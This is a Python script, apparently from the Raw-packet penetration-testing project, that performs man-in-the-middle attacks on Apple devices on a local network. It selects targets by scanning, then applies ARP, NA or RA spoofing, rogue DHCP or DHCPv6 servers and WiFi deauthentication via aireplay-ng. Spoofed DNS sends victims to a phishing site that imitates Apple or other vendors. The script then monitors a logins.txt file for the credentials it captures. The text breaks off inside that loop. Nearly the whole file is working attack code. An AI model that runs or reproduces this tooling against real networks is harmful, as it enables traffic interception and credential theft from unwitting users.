#!/usr/bin/env python
# -*- coding: utf-8 -*-

# region Description
"""
apple_dhcp_mitm.py: MiTM Apple devices in local network
Author: Vladimir Ivanov
License: MIT
Copyright 2019, Raw-packet Project
"""
# endregion

# region Import

# region Add project root path
from sys import path
from os.path import dirname, abspath
path.append(dirname(dirname(dirname(abspath(__file__)))))
# endregion

# region Raw-packet modules
from raw_packet.Utils.base import Base
from raw_packet.Scanners.scanner import Scanner
from raw_packet.Scanners.arp_scanner import ArpScan
from raw_packet.Scanners.icmpv6_scanner import ICMPv6Scan
from raw_packet.Utils.tm import ThreadManager
from raw_packet.Utils.network import Sniff_raw
from raw_packet.Servers.dns_server import DnsServer
# endregion

# region Import libraries
from prettytable import PrettyTable
try:
    from os import path, errno, makedirs, stat
except ImportError:
    from os import path, makedirs, stat
from shutil import copyfile, copytree
import subprocess as sub
from argparse import ArgumentParser, RawTextHelpFormatter
from sys import exit, stdout
from time import sleep
from ipaddress import IPv4Address
from socket import socket, AF_PACKET, SOCK_RAW
from random import randint
import re
from os.path import dirname, abspath
project_root_path = dirname(dirname(dirname(abspath(__file__))))
# endregion

# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2019, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.1.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Development'
# endregion

# region Check user, platform and print banner
Base = Base()
Base.check_user()
Base.check_platform()
Base.print_banner()
# endregion

# region Set global variables
aireply_stop = False
# endregion


# region Disconnect device
def disconnect_device(network_interface, ip_address, mac_address,
                      use_deauth_technique=False, deauth_interface=None, deauth_packets=5,
                      network_channel=None, network_bssid=None):

    if not use_deauth_technique:
        # Start Network conflict creator script
        sub.Popen(['python ' + project_root_path + '/Scripts/Others/network_conflict_creator.py' +
                   ' --interface ' + network_interface + ' --target_ip ' + ip_address + ' --target_mac ' + mac_address +
                   ' --requests --quiet --exit &'],
                  shell=True)

    else:
        # Start WiFi deauth packets sender
        deauth_packets_send(deauth_interface, network_channel, network_bssid, mac_address, deauth_packets)

# endregion


# region ARP spoofing
def make_arp_spoof(network_interface, target_mac_address, target_ip_address, gateway_ip_address):

    # Start ARP spoofing script
    sub.Popen(['python ' + project_root_path + '/Scripts/ARP/arp_spoof.py --interface ' + network_interface +
               ' --target_ip ' + target_ip_address + ' --target_mac ' + target_mac_address +
               ' --gateway_ip ' + gateway_ip_address + ' --quiet &'],
              shell=True)

    # Wait 3 seconds
    sleep(3)

# endregion


# region NA spoofing
def make_na_spoof(network_interface, target_mac_address, target_ipv6_address,
                  gateway_ipv6_address, dns_ipv6_address=None):

    # Start Neighbor Advertise spoofing script
    if dns_ipv6_address is not None:
        sub.Popen(['python ' + project_root_path + '/Scripts/ICMPv6/na_spoof.py --interface ' + network_interface +
                   ' --target_ip ' + target_ipv6_address + ' --target_mac ' + target_mac_address +
                   ' --gateway_ip ' + gateway_ipv6_address + ' --dns_ip ' + dns_ipv6_address + ' --quiet &'],
                  shell=True)
    else:
        sub.Popen(['python ' + project_root_path + '/Scripts/ICMPv6/na_spoof.py --interface ' + network_interface +
                   ' --target_ip ' + target_ipv6_address + ' --target_mac ' + target_mac_address +
                   ' --gateway_ip ' + gateway_ipv6_address + '--quiet &'],
                  shell=True)

    # Wait 3 seconds
    sleep(3)

# endregion


# region RA spoofing
def make_ra_spoof(network_interface, target_mac_address, target_ipv6_address,
                  gateway_ipv6_address, prefix, your_local_ipv6_address):

    # Start Router Advertise spoofing script
    sub.Popen(['python ' + project_root_path + '/Scripts/ICMPv6/ra_spoof.py --interface ' + network_interface +
               ' --target_ip ' + target_ipv6_address + ' --target_mac ' + target_mac_address +
               ' --gateway_ip ' + gateway_ipv6_address + ' --ipv6_prefix ' + prefix +
               ' --dns_ip ' + your_local_ipv6_address + ' --quiet &'],
              shell=True)

    # Wait 3 seconds
    sleep(3)

# endregion


# region Rogue DHCP server
def rogue_dhcp_server(network_interface, target_mac_address, target_ip_address):

    # Start DHCP rogue server
    sub.Popen(['python ' + project_root_path + '/Scripts/DHCP/dhcp_rogue_server.py --interface ' + network_interface +
               ' --target_ip ' + target_ip_address + ' --target_mac ' + target_mac_address + ' --apple --quiet &'],
              shell=True)

    # Wait 3 seconds
    sleep(3)

# endregion


# region Rogue DHCP server with predict next transaction ID
def rogue_dhcp_server_predict_trid(network_interface, target_mac_address, new_target_ip_address):

    # Start DHCP rogue server with predict next transaction ID
    sub.Popen(['python ' + project_root_path + '/Scripts/Apple/apple_rogue_dhcp.py --interface ' + network_interface +
               ' --target_ip ' + new_target_ip_address + ' --target_mac ' + target_mac_address + ' --quiet &'],
              shell=True)

    # Wait 3 seconds
    sleep(3)

# endregion


# region Rogue DHCPv6 server
def rogue_dhcpv6_server(network_interface, prefix, target_mac_address, target_global_ipv6_address):

    # Start DHCPv6 rogue server
    sub.Popen(['python ' + project_root_path + '/Scripts/DHCP/dhcpv6_rogue_server.py --interface ' + network_interface +
               ' --prefix ' + prefix + ' --target_ip ' + target_global_ipv6_address +
               ' --target_mac ' + target_mac_address + ' --quiet &'],
              shell=True)

    # Wait 3 seconds
    sleep(3)

# endregion


# region Start DNS server
def start_dns_server(network_interface, target_mac_address, technique_index,
                     fake_ip_address, mitm_success_domain):

    if technique_index in [1, 2, 3]:
        DnsServer.listen(listen_network_interface=network_interface,
                         target_mac_address=target_mac_address,
                         fake_answers=True,
                         fake_ip_addresses=[fake_ip_address],
                         disable_ipv6=True,
                         success_domains=['captive.apple.com', mitm_success_domain])

    if technique_index in [4, 5, 6]:
        DnsServer.listen(listen_network_interface=network_interface,
                         target_mac_address=target_mac_address,
                         fake_answers=True,
                         fake_ip_addresses=[fake_ip_address],
                         listen_ipv6=True,
                         disable_ipv6=True,
                         success_domains=['captive.apple.com', mitm_success_domain])
# endregion


# region Requests sniffer PRN function
def requests_sniffer_prn(request):
    global aireply_stop

    # region Stop aireplay-ng
    if 'DHCP' in request.keys() or 'ICMPv6' in request.keys():
        aireply_stop = True
        Base.kill_process_by_name('aireplay-ng')
    # endregion

# endregion


# region Requests sniffer function
def requests_sniffer(source_mac_address):

    # region Set network filter
    network_filters = {'Ethernet': {'source': source_mac_address}}
    # endregion

    # region Start sniffer
    sniff = Sniff_raw()
    sniff.start(protocols=['ARP', 'IP', 'IPv6', 'ICMPv6', 'UDP', 'DNS', 'DHCP'],
                prn=requests_sniffer_prn, filters=network_filters)
    # endregion


# endregion


# region WiFi deauth packets sender
def deauth_packets_send(network_interface, network_channel, network_bssid, mac_address, number_of_deauth):
    global aireply_stop

    # Start target requests sniffer function
    tm = ThreadManager(2)
    tm.add_task(requests_sniffer, mac_address)

    # Set WiFi channel on interface for send WiFi deauth packets
    sub.Popen(['iwconfig ' + network_interface + ' channel ' + network_channel], shell=True)

    # Start deauth packets numbers
    deauth_packets_number = number_of_deauth
    aireply_stop = False

    while deauth_packets_number < 50:

        # Check global variable aireplay_stop
        if aireply_stop:
            Base.print_info("Stop aireplay-ng ...")
            break

        # Start aireplay-ng process
        try:
            Base.print_info("Send WiFi deauth packets in aireplay-ng ...")
            aireplay_process = sub.Popen(['aireplay-ng ' + network_interface +
                                          ' -0 ' + str(deauth_packets_number) + ' -a ' + network_bssid +
                                          ' -c ' + mac_address], shell=True, stdout=sub.PIPE)
            while True:
                output = aireplay_process.stdout.readline()
                if output == '' and aireplay_process.poll() is not None:
                    break
                if output:
                    stdout.write(re.sub(r'(\d\d:\d\d:\d\d  (Waiting|Sending))', Base.c_info + r'\g<1>', output))

        except OSError as e:
            if e.errno == errno.ENOENT:
                Base.print_error("Program: ", "aireply-ng", " is not installed!")
                exit(1)
            else:
                Base.print_error("Something else went wrong while trying to run ", "`aireply-ng`")
                exit(2)

        # Wait before sniff request packet from target
        Base.print_info("Wait 10 sec. before sniff packets from target: " + mac_address)
        sleep(10)

        # Add 5 packets to number of WiFi deauth packets
        deauth_packets_number += 5


# endregion

# region Main function
if __name__ == "__main__":

    # region Variables
    Scanner = Scanner()
    ArpScan = ArpScan()
    ICMPv6Scan = ICMPv6Scan()
    DnsServer = DnsServer()
    TM = ThreadManager(5)

    ip_pattern = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")

    target_mac_address = None
    target_ip_address = None
    new_target_ip_address = None
    target_apple_device = None

    first_suffix = 2
    last_suffix = 255

    network_prefix = None
    network_prefix_address = None
    network_prefix_length = None

    deauth = False
    deauth_network_interface = None
    disconnect = False

    gateway_ipv6_address = None
    dns_ipv6_address = None
    real_prefix = None
    mtu = 1500
    # endregion

    # region Parse script arguments
    parser = ArgumentParser(description='MiTM Apple devices in local network', formatter_class=RawTextHelpFormatter)

    parser.add_argument('-T', '--technique', type=str, default=None,
                        help='Set MiTM technique:\n1. ARP Spoofing\n2. Second DHCP ACK\n3. Predict next DHCP ' +
                             'transaction ID\n4. Rogue SLAAC/DHCPv6 server\n5. NA Spoofing (IPv6)\n' +
                             '6. RA Spoofing (IPv6)')
    parser.add_argument('-D', '--disconnect', type=str, default=None,
                        help='Set device Disconnect technique:\n1. IPv4 network conflict detection\n' +
                             '2. Send WiFi deauthentication packets\n3. Do not disconnect device after MiTM')
    parser.add_argument('-l', '--listen_iface', type=str, help='Set interface name for send DHCPACK packets')
    parser.add_argument('-d', '--deauth_iface', type=str, help='Set interface name for send wifi deauth packets')
    parser.add_argument('-0', '--deauth_packets', type=int, help='Set number of deauth packets (default: 5)', default=5)
    parser.add_argument('-f', '--phishing_domain', type=str, default="auth.apple.wi-fi.com",
                        help='Set domain name for social engineering (default="auth.apple.wi-fi.com")')
    parser.add_argument('-p', '--phishing_domain_path', type=str, default="apple",
                        help='Set local path to for social engineering site \n' +
                             'in directory: raw_packet/Utils/Phishing_domains \n' +
                             'or use your own directory (default="apple")')
    parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', default=None)
    parser.add_argument('-n', '--new_ip', type=str, help='Set new IP address for target', default=None)
    parser.add_argument('-s', '--nmap_scan', action='store_true', help='Use nmap for Apple device detection')

    parser.add_argument('--kill', action='store_true', help='Kill all processes and threads')
    parser.add_argument('--ipv6_prefix', type=str, help='Set IPv6 network prefix, default - fd00::/64',
                        default='fd00::/64')

    args = parser.parse_args()
    # endregion

    # region Kill subprocesses

    # Kill subprocesses
    Base.kill_process_by_name('arp_spoof')
    Base.kill_process_by_name('na_spoof')
    Base.kill_process_by_name('ra_spoof')
    Base.kill_process_by_name('dhcp_rogue_server')
    Base.kill_process_by_name('dhcpv6_rogue_server')
    Base.kill_process_by_name('apple_rogue_dhcp')
    Base.kill_process_by_name('aireplay-ng')

    try:
        Base.print_info("Stop services dnsmasq and network-manager ...")
        sub.Popen(['service dnsmasq stop  >/dev/null 2>&1'], shell=True)
        sub.Popen(['service network-manager stop  >/dev/null 2>&1'], shell=True)
    except OSError as e:
        if e.errno == errno.ENOENT:
            Base.print_error("Program: ", "service", " is not installed!")
            exit(1)
        else:
            Base.print_error("Something went wrong while trying to run ", "`service ...`")
            exit(2)

    # Kill the processes that listens on 53, 68, 547 UDP port, 80 and 443 TCP ports
    Base.kill_process_by_listen_port(53, 'udp')
    Base.kill_process_by_listen_port(68, 'udp')
    Base.kill_process_by_listen_port(547, 'udp')
    Base.kill_process_by_listen_port(80, 'tcp')
    Base.kill_process_by_listen_port(443, 'tcp')

    # Exit
    if args.kill:
        exit(0)

    # endregion

    # region MiTM technique selection
    techniques = {
        1: "ARP Spoofing",
        2: "Second DHCP ACK",
        3: "Predict next DHCP transaction ID",
        4: "Rogue SLAAC/DHCPv6 server",
        5: "NA Spoofing (IPv6)",
        6: "RA Spoofing (IPv6)"
    }

    if args.technique is None:
        Base.print_info("MiTM technique list:")
        technique_pretty_table = PrettyTable([Base.cINFO + 'Index' + Base.cEND,
                                              Base.cINFO + 'MiTM technique' + Base.cEND])
        for technique_key in techniques.keys():
            technique_pretty_table.add_row([str(technique_key), techniques[technique_key]])

        print(technique_pretty_table)
        try:
            current_technique_index = raw_input(Base.c_info + 'Set MiTM technique index from range (1 - ' +
                                                str(len(techniques.keys())) + '): ')
        except NameError:
            current_technique_index = input(Base.c_info + 'Set MiTM technique index from range (1 - ' +
                                            str(len(techniques.keys())) + '): ')

    else:
        current_technique_index = args.technique

    if not current_technique_index.isdigit():
        Base.print_error("MiTM technique index is not digit!")
        exit(1)

    if any([int(current_technique_index) < 1, int(current_technique_index) > len(techniques.keys())]):
        Base.print_error("MiTM technique index is not within range (1 - " + str(len(techniques.keys())) + ")")
        exit(1)

    technique_index = int(current_technique_index)
    # endregion

    # region Disconnect device technique selection
    disconnect_techniques = {
        1: "IPv4 network conflict detection",
        2: "Send WiFi deauthentication packets",
        3: "Do not disconnect device after MiTM"
    }

    if args.disconnect is None:
        Base.print_info("Disconnect technique list:")
        disconnect_pretty_table = PrettyTable([Base.cINFO + 'Index' + Base.cEND,
                                              Base.cINFO + 'Disconnect technique' + Base.cEND])
        for technique_key in disconnect_techniques.keys():
            disconnect_pretty_table.add_row([str(technique_key), disconnect_techniques[technique_key]])

        print(disconnect_pretty_table)
        try:
            current_technique_index = raw_input(Base.c_info + 'Set Disconnect technique index from range (1 - ' +
                                                str(len(disconnect_techniques.keys())) + '): ')
        except NameError:
            current_technique_index = input(Base.c_info + 'Set Disconnect technique index from range (1 - ' +
                                            str(len(disconnect_techniques.keys())) + '): ')

    else:
        current_technique_index = args.disconnect

    if not current_technique_index.isdigit():
        Base.print_error("Disconnect technique index is not digit!")
        exit(1)

    if any([int(current_technique_index) < 1, int(current_technique_index) > len(disconnect_techniques.keys())]):
        Base.print_error("Disconnect technique index is not within range (1 - "
                         "" + str(len(disconnect_techniques.keys())) + ")")
        exit(1)

    disconnect_technique_index = int(current_technique_index)

    # Do not disconnect device after MiTM
    if disconnect_technique_index == 3:
        disconnect = False

    # Use disconnect technique
    else:
        disconnect = True

        # Use IPv4 network conflict detection
        if disconnect_technique_index == 1:

            if technique_index in [1, 3]:
                deauth = False

            else:
                Base.print_error("You chose MiTM technique: ", techniques[technique_index],
                                 " but this technique works only with WiFi deauthentication disconnect")
                Base.print_info("Change disconnect technique to: ", disconnect_techniques[2])
                deauth = True

        # Use WiFi deauthentication
        if disconnect_technique_index == 2:
            deauth = True

    # endregion

    # region Get listen network interface, your IP address, first and last IP in local network
    if args.listen_iface is None:
        Base.print_warning("Please set a network interface for sniffing target requests ...")
    listen_network_interface = Base.netiface_selection(args.listen_iface)

    your_mac_address = Base.get_netiface_mac_address(listen_network_interface)
    your_ip_address = Base.get_netiface_ip_address(listen_network_interface)

    your_local_ipv6_address = None
    if technique_index in [4, 5, 6]:
        your_local_ipv6_address = Base.get_netiface_ipv6_link_address(listen_network_interface)

        network_prefix = args.ipv6_prefix
        network_prefix_address = network_prefix.split('/')[0]
        network_prefix_length = network_prefix.split('/')[1]

    first_ip = Base.get_netiface_first_ip(listen_network_interface, 1)
    last_ip = Base.get_netiface_last_ip(listen_network_interface, -2)
    # endregion

    # region Get network interface for send wifi deauth packets, get wifi settings from listen network interface
    essid = None
    bssid = None
    channel = None
    freq = None

    if args.deauth_iface is not None:
        deauth = True

    if technique_index == 2:
        deauth = True

    if deauth:
        # region Get network interface for send wifi deauth packets
        if args.deauth_iface is None:
            Base.print_warning("Please set network interface for send WiFi deauth packets ...")
        deauth_network_interface = Base.netiface_selection(args.deauth_iface)

        if listen_network_interface == deauth_network_interface:
            Base.print_error("Network interface for listening target requests (", listen_network_interface,
                             ") and network interface for send WiFi deauth packets must be differ!")
            exit(1)
        # endregion

        # region Get wifi settings from listen network interface
        try:
            iwgetid = sub.Popen(['iwgetid -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
            essid, essid_err = iwgetid.communicate()
            iwgetid = sub.Popen(['iwgetid -a -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
            bssid, bssid_err = iwgetid.communicate()
            iwgetid = sub.Popen(['iwgetid -c -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
            channel, channel_err = iwgetid.communicate()
            iwgetid = sub.Popen(['iwgetid -f -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
            freq, freq_err = iwgetid.communicate()

            essid = essid.rstrip()
            bssid = bssid.rstrip()
            channel = channel.rstrip()
            freq = freq.rstrip()

            if essid is None or essid == "":
                Base.print_error("Network interface: ", listen_network_interface, " is not connected to WiFi AP!")
                exit(1)
        except OSError as e:
            if e.errno == errno.ENOENT:
                Base.print_error("Program: iwgetid is not installed!")
                exit(1)
            else:
                Base.print_error("Something else went wrong while trying to run `iwgetid`")
                exit(2)
        # endregion

    # endregion

    # region Set monitor mode on network interface for send wifi deauth packets
    if deauth:
        Base.print_info("Set Monitor mode on interface: ", deauth_network_interface, " ...")
        try:
            sub.Popen(['ifconfig ' + deauth_network_interface + ' down'], shell=True, stdout=sub.PIPE)
            sub.Popen(['iwconfig ' + deauth_network_interface + ' mode monitor >/dev/null 2>&1'],
                      shell=True, stdout=sub.PIPE)

            sleep(3)
            wireless_settings = sub.Popen(['iwconfig ' + deauth_network_interface],
                                          shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
            wireless_settings_out, wireless_settings_error = wireless_settings.communicate()

            if wireless_settings_out.find("Mode:Monitor") == -1:
                if wireless_settings_out.find("Mode:Auto") == -1:
                    Base.print_error("Could not set Monitor mode on interface: ", deauth_network_interface)
                    exit(1)

            sub.Popen(['ifconfig ' + deauth_network_interface + ' up'], shell=True, stdout=sub.PIPE)
        except OSError as e:
            if e.errno == errno.ENOENT:
                Base.print_error("Program: iwconfig or ifconfig is not installed!")
                exit(1)
            else:
                Base.print_error("Something else went wrong while trying to run `iwconfig` or `ifconfig`")
                exit(2)
    # endregion

    # region Check target IP and new IP addresses
    if args.target_ip is not None:
        if ip_pattern.match(args.target_ip):
            if Base.ip_address_in_range(args.target_ip, first_ip, last_ip):
                target_ip_address = args.target_ip
                Base.print_info("Target IP address: ", target_ip_address)
            else:
                Base.print_error("Target IP address: ", args.target_ip, " not in range: ", first_ip + " ... " + last_ip)
                exit(1)
        else:
            Base.print_error("Wrong target IP address: ", args.target_ip)
            exit(1)

    if args.new_ip is not None:
        if ip_pattern.match(args.new_ip):
            if Base.ip_address_in_range(args.new_ip, first_ip, last_ip):
                new_target_ip_address = args.new_ip
                Base.print_info("Target new IP address: ", new_target_ip_address)
            else:
                Base.print_error("Target new IP address: ", args.new_ip, " not in range: ",
                                 first_ip + " ... " + last_ip)
                exit(1)
        else:
            Base.print_error("Wrong target new IP address: ", args.new_ip)
            exit(1)
    # endregion

    # region General output
    Base.print_info("You chose MiTM technique: ", techniques[technique_index])
    Base.print_info("Listen network interface: ", listen_network_interface)

    if technique_index in [1, 2, 3]:
        Base.print_info("Your IP address: ", your_ip_address)
        Base.print_info("First ip address: ", first_ip)
        Base.print_info("Last ip address: ", last_ip)

        if target_ip_address is not None:
            Base.print_info("Target IP address: ", your_ip_address)

        if new_target_ip_address is not None:
            Base.print_info("Target new IP address: ", new_target_ip_address)

    else:
        Base.print_info("Your IPv6 local address: ", your_local_ipv6_address)
        Base.print_info("Prefix: ", network_prefix)
        Base.print_info("Router IPv6 address: ", your_local_ipv6_address)
        Base.print_info("DNS IPv6 address: ", your_local_ipv6_address)
        Base.print_info("First advertise IPv6 address: ", network_prefix_address + hex(first_suffix))
        Base.print_info("Last advertise IPv6 address: ", network_prefix_address + hex(last_suffix))

    if deauth:
        Base.print_info("Interface ", listen_network_interface, " connect to: ", essid + " (" + bssid + ")")
        Base.print_info("Interface ", listen_network_interface, " channel: ", channel)
        Base.print_info("Interface ", listen_network_interface, " frequency: ", freq)
        Base.print_info("Deauth network interface: ", deauth_network_interface)
    # endregion

    # region Social engineering

    # region Disable ipv4 forwarding
    Base.print_info("Disable ipv4 forwarding")
    ipv4_forward_file_name = "/proc/sys/net/ipv4/ip_forward"
    with open(ipv4_forward_file_name, 'w') as ipv4_forward_file:
        ipv4_forward_file.write("0")
    # endregion

    # region Check OS installed software
    Base.print_info("Check OS installed software")
    Base.check_installed_software("apache2")
    Base.check_installed_software("service")
    Base.check_installed_software("ps")
    # endregion

    # region Variables
    script_dir = project_root_path
    apache2_sites_available_dir = "/etc/apache2/sites-available/"
    apache2_sites_enabled_dir = "/etc/apache2/sites-enabled/"
    apache2_sites_path = "/var/www/html/"
    redirect_path = apache2_sites_path + "redirect/"
    # endregion

    # region Set phishing domain and path
    se_domain = args.phishing_domain
    if args.phishing_domain_path == "google" or "apple" or "microsoft":
        se_path = apache2_sites_path + args.phishing_domain_path
    else:
        se_path = args.phishing_domain_path

    Base.print_info("Phishing domain: ", se_domain)
    Base.print_info("Phishing domain local path: ", se_path)
    # endregion

    # region Directory for phishing domain
    if not path.exists(se_path):
        if args.phishing_domain_path == "google" or "apple" or "microsoft":
            copytree(src=project_root_path + "/raw_packet/Utils/Phishing_domains/" + args.phishing_domain_path, dst=se_path)
        else:
            Base.print_error("Directory: ", se_path, " does not exist!")
            exit(1)

    credentials_file_name = se_path + '/logins.txt'
    sub.Popen(['chmod 777 ' + credentials_file_name + ' >/dev/null 2>&1'], shell=True)
    # endregion

    # region Apache2 sites settings
    default_site_file_name = "000-default.conf"
    default_site_file = open(apache2_sites_available_dir + default_site_file_name, 'w')
    default_site_file.write("<VirtualHost *:80>\n" +
                            "\tServerAdmin admin@apple.com\n" +
                            "\tRewriteEngine on\n" +
                            "\tRewriteCond %{REQUEST_FILENAME} !-f\n" +
                            "\tRewriteCond %{REQUEST_FILENAME} !-d\n" +
                            "\tRewriteRule ^(.*)$ /redirect.php?page=$1 [NC]\n" +
                            "\tDocumentRoot " + redirect_path + "\n" +
                            "\t<Directory " + redirect_path + ">\n" +
                            "\t\tOptions FollowSymLinks\n" +
                            "\t\tAllowOverride None\n" +
                            "\t\tOrder allow,deny\n" +
                            "\t\tAllow from all\n" +
                            "\t</Directory>\n" +
                            "</VirtualHost>\n\n" +
                            "<VirtualHost *:80>\n" +
                            "\tServerName " + se_domain + "\n" +
                            "\tServerAdmin admin@" + se_domain + "\n" +
                            "\tDocumentRoot " + se_path + "\n" +
                            "\t<Directory " + se_path + ">\n" +
                            "\t\tOptions FollowSymLinks\n" +
                            "\t\tAllowOverride None\n" +
                            "\t\tOrder allow,deny\n" +
                            "\t\tAllow from all\n" +
                            "\t</Directory>\n" +
                            "</VirtualHost>\n")
    default_site_file.close()

    # Create dir with redirect script
    try:
        makedirs(redirect_path)
    except OSError:
        Base.print_info("Path: ", redirect_path, " already exist")
    except:
        Base.print_error("Something else went wrong while trying to create path: ", redirect_path)
        exit(1)

    # Copy and change redirect script
    redirect_script_name = "redirect.php"
    redirect_script_src = script_dir + "/raw_packet/Utils/" + redirect_script_name
    redirect_script_dst = redirect_path + redirect_script_name

    copyfile(src=redirect_script_src, dst=redirect_script_dst)

    # Read redirect script
    with open(redirect_script_dst, 'r') as redirect_script:
        content = redirect_script.read()

    # Replace the string
    content = content.replace('se_domain', se_domain)
    content = content.replace('se_path', se_path)

    # Write redirect script
    with open(redirect_script_dst, 'w') as redirect_script:
        redirect_script.write(content)

    try:
        Base.print_info("Restarting apache2 server ...")
        sub.Popen(['a2enmod rewrite  >/dev/null 2>&1'], shell=True)
        sub.Popen(['service apache2 restart  >/dev/null 2>&1'], shell=True)
    except OSError as e:
        if e.errno == errno.ENOENT:
            Base.print_error("Program: ", "service", " is not installed!")
            exit(1)
        else:
            Base.print_error("Something went wrong while trying to run ", "`service apache2 restart`")
            exit(2)
    # endregion

    # region Check apache2 is running
    sleep(2)
    apache2_pid = Base.get_process_pid("apache2")
    if apache2_pid == -1:
        Base.print_error("Apache2 server is not running!")
        exit(1)
    else:
        Base.print_info("Apache2 server is running, PID: ", str(apache2_pid))
    # endregion

    # endregion

    # region Scan IPv4 local network
    if technique_index in [1, 2, 3]:

        # region Find Apple devices in local network with ArpScan or nmap
        if args.target_ip is None:
            if not args.nmap_scan:
                Base.print_info("ARP scan is running ...")
                apple_devices = Scanner.find_apple_devices_by_mac(listen_network_interface)
            else:
                Base.print_info("NMAP scan is running ...")
                apple_devices = Scanner.find_apple_devices_with_nmap(listen_network_interface)

            target_apple_device = Scanner.apple_device_selection(apple_devices)
        # endregion

        # region Find Mac address of Apple device if target IP is set
        if args.target_ip is not None:
            Base.print_info("Search MAC address of Apple device with IP address: ", target_ip_address, " ...")
            target_mac_address = ArpScan.get_mac_address(listen_network_interface, target_ip_address)
            if target_mac_address == "ff:ff:ff:ff:ff:ff":
                Base.print_error("Could not find device MAC address with IP address: ", target_ip_address)
                exit(1)
            else:
                target_apple_device = [target_ip_address, target_mac_address]
        # endregion

    # endregion

    # region Scan IPv6 local network
    if technique_index in [4, 5, 6]:

        # region Find Apple devices in local network with ICMPv6 scan
        Base.print_info("ICMPv6 scan is running ...")
        apple_devices = Scanner.find_apple_devices_by_mac_ipv6(listen_network_interface)
        target_apple_device = Scanner.apple_device_selection(apple_devices)
        # endregion

    # endregion

    # region Check variable target_apple_device
    # target_apple_device = ["192.168.119.123", "12:34:56:78:90:ab"] # DEBUG

    if target_apple_device is not None:
        if len(target_apple_device) == 3:
            target_ip_address = target_apple_device[0]
            target_mac_address = target_apple_device[1]
        else:
            Base.print_error("Bad value in target Apple device!")
            exit(1)
    else:
        Base.print_error("Target Apple device not found!")
        exit(1)
    # endregion

    # region Run DNS server
    Base.print_info("Start DNS server ...")
    TM.add_task(start_dns_server, listen_network_interface, target_mac_address, technique_index,
                your_ip_address, se_domain)
    # endregion

    # region Get network interface gateway IPv6 address
    if technique_index in [5, 6]:
        Base.print_info("Search IPv6 Gateway and DNS server ...")
        router_advertisement_data = ICMPv6Scan.search_router(listen_network_interface, 5, 3)

        if router_advertisement_data is not None:
            gateway_ipv6_address = router_advertisement_data['router_ipv6_address']

            if 'dns-server' in router_advertisement_data.keys():
                dns_ipv6_address = router_advertisement_data['dns-server']

            if 'prefix' in router_advertisement_data.keys():
                real_prefix = router_advertisement_data['prefix']
            else:
                real_prefix = network_prefix

            if 'mtu' in router_advertisement_data.keys():
                mtu = int(router_advertisement_data['mtu'])
        else:
            Base.print_error("Can not find IPv6 gateway in local network on interface: ", listen_network_interface)
            exit(1)
    # endregion

    # region 1. ARP spoofing technique
    if technique_index == 1:

        # region Get network interface gateway IP address
        gateway_ip_address = Base.get_netiface_gateway(listen_network_interface)

        if gateway_ip_address is None:
            Base.print_error("Could not found gateway on interface: ", listen_network_interface)
            try:
                gateway_ip_address_input = raw_input(Base.c_info + 'Set gateway IP address: ')
            except NameError:
                gateway_ip_address_input = input(Base.c_info + 'Set gateway IP address: ')
            if ip_pattern.match(gateway_ip_address_input):
                if Base.ip_address_in_range(gateway_ip_address_input, first_ip, last_ip):
                    gateway_ip_address = gateway_ip_address_input
                    Base.print_info("Gateway IP address: ", gateway_ip_address)
                else:
                    Base.print_error("Gateway IP address: ", gateway_ip_address_input, " not in range: ",
                                     first_ip + " ... " + last_ip)
                    exit(1)
            else:
                Base.print_error("Bad IPv4 address: ", gateway_ip_address_input)
                exit(1)
        # endregion

        # region Start ARP spoof
        make_arp_spoof(listen_network_interface, target_mac_address, target_ip_address, gateway_ip_address)
        # endregion

    # endregion

    # region 2. Second DHCP ACK technique
    if technique_index == 2:

        # region Start Rogue DHCP server
        rogue_dhcp_server(listen_network_interface, target_mac_address, target_ip_address)
        # endregion

    # endregion

    # region 3. Predict next DHCP transaction ID
    if technique_index == 3:

        # region Find free IP in local network
        if new_target_ip_address is None:

            # region Fast scan localnet with ArpScan
            Base.print_info("Search for free IP addresses on the local network ...")
            localnet_ip_addresses = Scanner.find_ip_in_local_network(listen_network_interface)
            # endregion

            index = 0
            while new_target_ip_address is None:
                try:
                    check_ip = str(IPv4Address(unicode(first_ip)) + index)
                except NameError:
                    check_ip = str(IPv4Address(first_ip) + index)
                if check_ip != your_ip_address:
                    if check_ip not in localnet_ip_addresses:
                        new_target_ip_address = check_ip
                    else:
                        index += 1
                else:
                    index += 1

        Base.print_info("Find new IP address: ", new_target_ip_address, " for target")
        # endregion

        # region Start Rogue DHCP server with predict next transaction ID
        rogue_dhcp_server_predict_trid(listen_network_interface, target_mac_address, new_target_ip_address)
        # endregion

    # endregion

    # region 4. Rogue SLAAC/DHCPv6 server
    if technique_index == 4:

        # region Start Rogue DHCPv6 server
        target_global_ipv6_address = network_prefix_address + str(randint(first_suffix, last_suffix))
        Base.print_info("New global IPv6 address: ", target_global_ipv6_address,
                        " for target: ", target_ip_address + " (" + target_mac_address + ")")
        rogue_dhcpv6_server(listen_network_interface, network_prefix, target_mac_address, target_global_ipv6_address)
        # endregion

    # endregion

    # region 5. NA Spoofing (IPv6)
    if technique_index == 5:

        # region Start Neighbor Advertise spoof
        make_na_spoof(listen_network_interface, target_mac_address, target_ip_address,
                      gateway_ipv6_address, dns_ipv6_address)
        # endregion

    # endregion

    # region 6. RA Spoofing (IPv6)
    if technique_index == 6:

        # region Start Neighbor Advertise spoof
        make_ra_spoof(listen_network_interface, target_mac_address, target_ip_address,
                      gateway_ipv6_address, real_prefix, your_local_ipv6_address)
        # endregion

    # endregion

    # region Disconnect device
    if disconnect:
        disconnect_device(listen_network_interface, target_ip_address, target_mac_address,
                          deauth, deauth_network_interface, args.deauth_packets, channel, bssid)
    # endregion

    # region Check credentials

    # Get credentials file size
    credentials_file_size = stat(credentials_file_name).st_size

    try:
        while True:
            # Credentials file has changed
            if stat(credentials_file_name).st_size > credentials_file_size:

                # Read credentials file
                credentials_file_descriptor = open(credentials_file_name, 'r')
                credentials_file_descriptor.seek(credentials_file_size)
                try:
